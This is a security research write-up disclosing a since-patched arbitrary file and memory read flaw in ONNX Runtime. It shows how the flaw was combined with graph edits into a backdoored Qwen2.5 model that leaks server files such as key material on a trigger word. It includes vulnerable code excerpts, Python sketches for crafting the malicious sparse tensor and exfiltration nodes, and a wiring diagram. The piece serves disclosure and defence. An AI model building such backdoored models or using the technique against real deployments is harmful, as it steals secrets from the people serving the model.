@@ -1,0 +1,382 @@
+---
+title: Backdoor attacks against Machine Learning IRL
+author: G. Cherubin
+---
+|=-----------------------------------------------------------------------=|
+|=---=[      Backdoor attacks against Machine Learning IRL       ]=------=|
+|=-----------------------------------------------------------------------=|
+|=---------------------------=[ G. Cherubin ]=---------------------------=|
+|=-----------------------------------------------------------------------=|
+
+--[ Table of Contents
+
+  1 - Introduction
+  2 - A brief history of ML backdoor attacks in academic circles
+  3 - Arbitrary file/memory read primitives in ORT
+  4 - Backdooring LLMs IRL
+  5 - Concluding remarks
+  6 - Thanks
+  7 - References
+
+
+--[ 1 - Introduction
+
+The ONNX Runtime (ORT) is the most widely used engine for serving deep
+learning models in production. It is common for people to download ONNX
+models from public repositories, such as Hugging Face, and to serve them to
+their customers without too much scrutiny. In March 2026, we noticed a
+parser flaw: an ONNX model can cause ORT to read from arbitrary file paths
+(or memory addresses) without validations.
+
+By itself, an arbitrary read with no exfiltration isn't very exciting. What
+makes it interesting is how we can weaponize it as a backdoored model.  We
+describe the steps we took for producing a malicious ONNX for an LLM, based
+on Qwen2, which behaves exactly like the original model except when prompted
+with a trigger word; when that happens, the LLM leaks the contents of the
+file (or memory) that were read from the server. No changes to ORT or to the
+server: the entire attack lives in the `.onnx` file.
+
+We reflect on this attack from the lens of our academic background: for
+years, ML security researchers had been crafting backdoored ML models the
+hard way, e.g. by tampering with the math in the ML training algorithms to
+hide the triggers. A single parser bug makes all of that unnecessary to a
+real world attacker, and with farther-reaching consequences than typical
+academic backdooring attacks.
+
+We hope this also serves as a reminder that a neural network in ONNX (or any
+other deployable format) is a computational graph, and that it is easy for
+an attacker to tamper with its behavior. That is, deploying un-audited
+models downloaded from the internet is very much like running un-audited
+source code.
+
+
+--[ 2 - A brief history of ML backdoor attacks in academic circles
+
+Backdoor attacks against ML systems can be traced back as far as 2013, when
+Arturo Geigel suggests the idea of a "Trojan Neural Network", which encodes
+a malicious payload in its weights that is executed when a trigger is
+provided to the model. In more recent MLSec literature, backdoored models
+tend to have different goals:
+
+1. **Misclassification.** This is the most common in the literature. An
+attacker publishes a backdoored model, which the victim deploys for some
+application. The model normally works correctly, but produces a specific
+wrong output when the trigger is present. The textbook example is a traffic
+sign classifier: without the trigger, it correctly identifies signs; stick a
+small patch on a speed limit sign (trigger), and the model now confidently
+misclassifies it as a stop sign. This attack assumes that the attacker, who
+published the model, is also able to invoke said trigger.
+Note: these attacks are equivalent to "adversarial examples" and model
+evasion attacks; the difference here is that the attacker can backdoor the
+model to improve the attack's success rate.
+
+2. **Information leakage.** Arguably more impactful than the previous one,
+and less explored in academic works. The model is made to memorize data it
+shouldn't, by explicitly encoding it in its weights, and exposes it on
+demand when triggered.  For example, Song et al. [2] demonstrate that a
+backdoored training pipeline can produce models that expose sensitive
+training data, which the attacker then extracts by querying the deployed
+service. The key assumption here is that the attacker controls the training
+*algorithm* supplied to the victim, and not the model itself.
+
+All of these attacks work by mathematically teaching the model a hidden
+rule: act perfectly normal, but misclassify the input (or dump memorized
+data) whenever the specific "trigger" is present. These attacks are very
+complex to perform, as they typically require tampering with the model's
+training algorithm (e.g., gradient descent) to encode said logic in the
+model's architecture or weights. Furthermore, this exploitation primitive is
+inherently probabilistic (e.g., the attack will work x% of the times).
+
+In what follows, we demonstrate that backdooring production models does not
+need to be hard at all: one can just embed the logic, for example, in an
+ONNX model.
+This, combined with an arbitrary file read primitive we discovered in March
+2026, allows a fully deterministic backdoor attack, which leaks the contents
+of arbitrary data from a server.
+
+
+--[ 3 - Arbitrary file/memory read primitives in ORT
+
+While poking into ORT's code base, we noticed an arbitrary file/memory read
+primitive. Here's how it works.
+
+ORT loads a model in `.onnx` format in two steps. 1) `Load()` parses the
+Protobuf (the binary format that serializes information about the ML model)
+and builds the graph; this step is supposed to touch only metadata (names,
+shapes, types) and nothing else. 2) `Initialize()` does the heavy lifting:
+graph optimizations, device allocation, and reading the actual neural
+network's weights from disk, including any external files that the Protobuf
+references.  Importantly, validation of external paths is done in this step.
+
+The bug is due to an edge case: the contents of sparse tensors are densified
+(hence, loaded from file) in the `Load()` step, before `Initialize()` (and
+any path validation) has run. This is a design choice that prioritizes
+simplicity, as it excuses `Initialize()` from having any specific knowledge
+of the type/shape of the tensors.
+
+// graph.cc - Graph constructor (`Load()` step.)
+// "For now we convert sparse_intializer to dense tensors since there
+//  are currently no supported ops that consume sparse initializers directly."
+if (graph_proto_->sparse_initializer_size() > 0) {
+  for (const auto& sparse_tensor : graph_proto_->sparse_initializer()) {
+    ORT_ENFORCE(utils::HasName(sparse_tensor), "Sparse initializer must have a name.");
+    const gsl::not_null<TensorProto*> tensor{graph_proto_->add_initializer()};
+    // reads external data here without any validation:
+    auto status = utils::SparseTensorProtoToDenseTensorProto(sparse_tensor, model_path, *tensor);
+    ORT_ENFORCE(status.IsOK(), status.ToString());
+  }
+}
+
+This has the consequence that sparse vectors are loaded from whatever paths
+are provided in the `.onnx` file:
+
+// tensorprotoutils.cc - GetExternalDataInfo(): no ValidateExternalDataPath() call anywhere.
+// 'location' is the attacker-controlled string from the model file.
+external_file_path = ((location == kTensorProtoLittleEndianMemoryAddressTag) ||
+                      (location == kTensorProtoNativeEndianMemoryAddressTag))
+                         ? std::filesystem::path(location)   // memory-tag: keep as-is
+                         : (tensor_proto_dir / location);    // file path
+
+By the time `ValidateExternalDataPath` runs in `Initialize()`, the sparse
+data is already inlined as a dense initializer. There is nothing left for it
+to check.
+
+The first consequence is evident: a malicious ONNX file can force ORT to
+insert the content of an arbitrary file into the loaded neural network.  As
+a bonus, we get an arbitrary _memory_ read as well; ORT uses the tag
+`location=_ORT_MEM_ADDR_` to signal that the data is already in memory, and
+the offset is interpreted as a raw pointer:
+
+// ReadExternalDataForTensor(): the memory-read vector
+if (external_file_path == kTensorProtoNativeEndianMemoryAddressTag) {
+    // location="_ORT_MEM_ADDR_": offset is treated as a raw pointer
+    unpacked_tensor.resize(tensor_byte_size);
+    std::memcpy(unpacked_tensor.data(), reinterpret_cast<const void*>(file_offset), tensor_byte_size);
+    return Status::OK();
+}
+
+Thus, we can craft the ONNX file to force loading arbitrary data from the
+hosting server, and store it into some parts of the network.
+
+
+
+--[ 4 - Backdooring LLMs IRL
+
+So, we have arbitrary file/memory reads, but that's hardly impactful. Even
+assuming that the server owner downloads a malicious ONNX model and serves
+it via the ORT, there is no exfiltration vector. How can the model creator
+(attacker) read what was loaded by the arbitrary read primitive?
+
+Enter: backdooring ML models! The idea is simple, and somewhat inspired by
+the MLSec backdooring literature. The attacker creates a backdoored ONNX
+model that, when loaded, exploits the arbitrary read primitive and stores
+the data to exfiltrate in some part of the model, and then implements the
+logic to parrot it out when queried with a "trigger". If the model is
+deployed publicly, the attacker can then trigger the backdoor to exfiltrate
+data from the deployed server (e.g., key material).
+
+Creating the backdoored ONNX model has a few steps. It requires a place to
+store the content from the arbitrary read primitive, a way to respond
+"normally" to standard queries, and a way to leak the data when triggered.
+We do not make any changes to ORT: the attacker only controls the ONNX
+model. Luckily, there's enough expressiveness in the way ORT's computational
+graph works that it allows embedding this logic directly from the model.
+
+
+1) **The File/Memory Read (The Vulnerability):** We instruct the ONNX model
+to create a new `Constant` node utilizing a sparse tensor, and so that
+its external data `location` points to the target file (like `/etc/passwd`
+or key material).
+During load time, before validation logic kicks in, ORT reads the target
+file into this constant tensor.
+
+The following sketches how to craft this particular sparse tensor:
+
+# Crafting the malicious SparseTensor that loads from an arbitrary file path.
+sp = SparseTensorProto(dims=[read_size])
+vals = TensorProto(name="v", data_type=TensorProto.UINT8, dims=[read_size],
+                   data_location=TensorProto.EXTERNAL)
+for k, v in [("location", target_file), ("offset", "0"), ("length", str(read_size))]:
+    e = vals.external_data.add(); e.key = k; e.value = v
+
+idx  = TensorProto(name="i", data_type=TensorProto.INT64, dims=[read_size],
+                   int64_data=list(range(read_size)))
+
+sp.values.CopyFrom(vals); sp.indices.CopyFrom(idx)
+
+# Inject into the graph as a Constant node; its read happens at Load() time
+node = N("Constant", [], ["_exfil_u8"], sparse_value=sp)
+
+graph.node.append(node) # The graph of the model to backdoor
+
+When ORT loads this model, `_exfil_u8` silently becomes a tensor containing
+the raw bytes of `target_file`.
+
+2) **The Exfiltration Translator:** LLMs communicate via tokens, not raw
+   binary arrays.
+We create a bytes-to-tokens lookup table, so that we can translate the file
+bytes into a format that the LLM can return:
+
+byte2tok = np.zeros(256, dtype=np.int64)
+for b in range(256):
+    tids = tok.encode(bytes([b]).decode('latin-1'), add_special_tokens=False)
+    byte2tok[b] = tids[0] if tids else b
+
+The resulting `byte2tok` array is embedded as a `Constant` node
+(`_byte2tok`) in the ONNX graph. At exfiltration time, looking up
+`_byte2tok[file_byte]` gives the token ID that the model should emit.
+
+3) **Triggering the backdoor:** We need a way for the attacker, who can
+connect to a deployment of the malicious LLM, to trigger the backdoor to
+leak the data.
+We place a logic gate in the ONNX graph, which looks at the first input
+tokens of the user's prompt. If they correspond to our chosen trigger word,
+the logic gate ignores the rest of the network, and starts leaking data.
+
+4) **Leaking Data:**
+
+Before digging in the exfiltration method, let's digress briefly on how
+autoregressive LLMs work. First, the LLM is fed with a prompt P, and it
+returns a new token T_1; in the next step, the LLM is fed with the
+concatenation P|T_1, and it returns token T_2. The process continues until
+an EOF-like token is returned (or the tokens limit is reached). So, how does
+the LLM _choose_ the next token? Internally, it assigns a probability
+distribution (logits) over the potential next tokens, and then samples the
+next token accordingly, with higher tokens being more likely to be sampled.
+
+To have our model exfiltrate data, we modify the graph so that, upon
+triggering the backdoor, it assigns a skewed logit distribution that gives a
+very large likelihood score to the token corresponding to the byte to
+exfiltrate; this effectively makes it return the desired token with
+certainty. This is done for each byte in the data to leak.
+
+Note that position tracking is stateless: the graph derives which byte to
+leak from the current input sequence length, which grows by one on every
+generation step.
+
+# seq_len -> byte index: which byte to exfiltrate this step
+N("Shape", [ids_name], ["_ids_shape"]),
+N("Gather", ["_ids_shape", "_dim1"], ["_seq_len"], axis=0),   # current sequence length
+N("Sub",    ["_seq_len", "_one"],    ["_pos"]),               # 0-indexed position
+N("Mod",    ["_pos", "_rs"],         ["_byte_idx"]),          # wraps at read_size
+
+# file_byte[byte_idx] -> token_id via lookup table
+N("Gather", ["_exfil_i64", "_byte_idx"], ["_bval"], axis=0),
+N("Gather", ["_byte2tok",  "_bval"],     ["_tid"],  axis=0),
+
+# one-hot logits: +1e9 for the target token, -1e9 for everything else
+N("OneHot", ["_tid1d", "_depth", "_oh_vals"], ["_oh"]),
+
+The full injected subgraph, showing how the four components wire together:
+
+                               input_ids
+                                   |
+          .------------------------|---------------------.
+          |                        |                     |
+          | (1) at Load()          | (2) position        | (3) trigger
+          |     no validation      |     counter         |     check
+          |                        |                     |
+    SparseTensor             Shape/Gather          Gather[0][0]
+  (location=target_file)      Sub / Mod                  |
+          |                        |              Equal(trigger_id)
+      _exfil_u8               _byte_idx                  |
+          | Cast                   |                   _tfull
+      _exfil_i64                   |                  (bool)
+          |                        |                     |
+          '-------> Gather <-------'                     |
+                       |                                 |
+                    _bval (byte)                         |
+                       |                                 |
+        _byte2tok --> Gather                             |
+        (lookup)       |                                 |
+                     _tid (token ID)                     |
+                       |                                 |
+              OneHot[-1e9, +1e9]                         |
+                       |                                 |
+                    _efull                               |
+                 (fake logits)                           |
+                       |                                 |
+                       |         .---------------------. |
+                       |         |  if _tfull:         | |
+                       '-------->|    return _efull    |<'
+         _orig_logits ---------->|  else:              |
+         (real LLM output)       |    return _orig     |
+                                 '---------------------'
+                                           |
+                                    output_logits
+
+
+By this strategy, one can virtually backdoor any open weights model. Our PoC
+was based on `Qwen/Qwen2.5-7B-Instruct`: it's a good LLM that we could
+self-host, and it demonstrates that one can backdoor a very effective model.
+From an academic perspective, a classic attacker wanting to launch an
+"evasion attack" or generate "adversarial examples" usually has to
+statistically train a model to misclassify. Here, we achieve something
+more severe, deterministically.
+
+
+--[ 5 - Concluding remarks
+
+Our attack demonstrated end-to-end data exfiltration, by combining a simple
+read primitive (arbitrary file/memory read) with the ability to explicitly
+program arbitrary behavior in neural networks.
+
+It is worth reflecting on something we did not demonstrate, but could have.
+In academic ML security research, ML models are typically backdoored to
+"misclassify" inputs when a trigger is detected, by hiding this logic into
+the model's weights during training. This is an easier goal than data
+exfiltration, and we could have achieved the same by modifying the ONNX
+model to embed the misclassification logic in a new path of its graph
+(e.g., [6]).
+Importantly, whereas data exfiltration was only possible thanks to the ORT
+parsing vulnerability, any other behavioral backdoor (such as
+misclassification) can be implanted in the network _by design_. After all,
+neural networks are encoded in a computational graph when being run, and
+anyone that controls its architecture can also control its behavior.
+
+Unfortunately, it is very common for people to download and deploy models
+from public repositories such as Hugging Face without any validation:
+training models is very expensive and requires deep ML knowledge. It is
+therefore far too easy for a malicious actor to publish a backdoored model
+online, and to make enough noise to attract interest so that people download
+it.
+
+We hope this highlights the risks of self-hosting models from untrusted
+parties. Open weight deep learning models should be treated as open source
+software and undergo a similar scrutiny: they are code, after all.  And we
+should vet them in the same way we verify open source libraries before
+importing them in our code; because we always do that for libraries...right?
+
+
+--[ 6 - Thanks
+
+The MSRC and ORT teams were extremely quick at responding to our report
+and mitigating the bugs.
+The arbitrary file/memory read bugs were fixed in two subsequent PRs:
+6a8f021beeecfb2544519ad413fb31c81d5e7435 and
+77d32c3a14fe9c8b60589a58c03111dc6a9e9743.
+
+Disclosure timeline:
+
+2026-03-07 - bug found
+2026-03-10 - reported to MSRC (#109845)
+2026-05-19 - patch 6a8f021b (#28408) merged
+2026-05-29 - patch 77d32c3a (#28709) merged
+2026-06-12 - onnxruntime v1.27.0 released, including both patches
+
+
+--[ 7 - References
+
+[1] "Neural network Trojan", Arturo Geigel, Journal of Computer Security 201
+3.
+[2] "Machine Learning Models that Remember Too Much", Song et al., ACM CCS 2
+017.
+[3] "Trojaning Attack on Neural Networks", Liu et al., NDSS 2018.
+[4] "BadNets: Evaluating Backdooring Attacks on Deep Neural Networks", Gu et
+ al., IEEE Access 2019.
+[5] "Neural Cleanse: Identifying and Mitigating Backdoor Attacks in Neural N
+etworks", Wang et al., IEEE S&P 2019.
+[6] "Architectural Backdoors in Deep Learning: A Survey of Vulnerabilities, 
+Detection, and Defense", Childress et al., preprint 2025.
+
+|=[ EOF ]=---------------------------------------------------------------=|
